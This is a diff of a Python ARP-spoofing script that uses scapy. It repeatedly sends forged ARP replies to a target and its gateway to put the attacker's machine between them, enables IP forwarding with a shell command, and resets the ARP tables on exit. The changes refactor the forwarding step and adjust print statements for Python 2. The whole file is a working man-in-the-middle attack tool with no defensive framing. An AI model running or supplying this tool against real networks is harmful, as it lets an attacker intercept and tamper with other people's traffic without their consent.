@@ -1,9 +1,15 @@
 #!/usr/bin/env python
 import argparse
 import subprocess
+import sys
 import time
 
+# pip install scapy
 import scapy.all as scapy
+
+
+# Windows
+# https://scapy.readthedocs.io/en/latest/installation.html#windows
 
 
 def get_arguments():
@@ -39,24 +45,28 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, count=4, verbose=False)
 
 
+def setup_port_forwarding():
+    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
+    print("Port forwarding setup done!")
+
+
 options = get_arguments()
 target_ip = options.target
 gateway_ip = options.gateway
 
 try:
-    # Setup port forwarding
-    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
-    print("Port forwarding setup done!")
+    setup_port_forwarding()
     sent_packets_count = 0
     while True:
         spoof(target_ip, gateway_ip)  # Send to target. Set attacker machine as router
         spoof(gateway_ip, target_ip)  # Send to router. Set attacker machine as router
         sent_packets_count += 2
-        # print(f"\n[+] Packets sent: {sent_packets_count}"), sys.stdout.flush() # python 2
-        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
+        print("\r[+] Packets sent: " + str(sent_packets_count)),
+        sys.stdout.flush()  # python 2
+        # print("\r[+] Packets sent: " + str(sent_packets_count), end="")  # # python 3
         time.sleep(2)
 except KeyboardInterrupt:
-    print("[+] Detecting CTRL + C .... Resetting ARP tables... Please wait\n")
+    print("\n[+] Detecting CTRL + C .... Resetting ARP tables... Please wait\n")
     restore(target_ip, gateway_ip)
     restore(gateway_ip, target_ip)
 
